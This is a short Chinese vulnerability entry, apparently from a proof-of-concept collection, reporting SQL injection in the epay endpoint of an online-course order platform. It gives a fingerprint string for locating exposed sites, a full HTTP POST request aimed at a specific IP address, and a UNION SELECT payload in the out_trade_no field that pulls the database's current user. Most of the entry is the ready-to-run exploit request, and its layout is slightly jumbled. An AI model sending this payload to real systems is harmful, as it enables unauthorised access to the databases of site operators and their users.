# 网课交单平台epay存在SQL注入漏洞

- **系统**：网课交单平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"/apisub.php"`
- **请求**：`POST /epay/epay.php HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 157`　`Priority: u=1`

**请求体 / payload**
```
out_trade_no=' UNION ALL SELECT 1,CONCAT(IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),3,4,5,6,7,8,9,10,11,12,13-- -
POST /epay/epay.php HTTP/1.1
Host: 101.33.219.180:89
Content-Type: application/x-www-form-urlencoded
Content-Length: 157
Priority: u=1
out_trade_no=1
>
```

**其他**
- 网课交单平台epay存在SQL注入漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: + 网课交单平台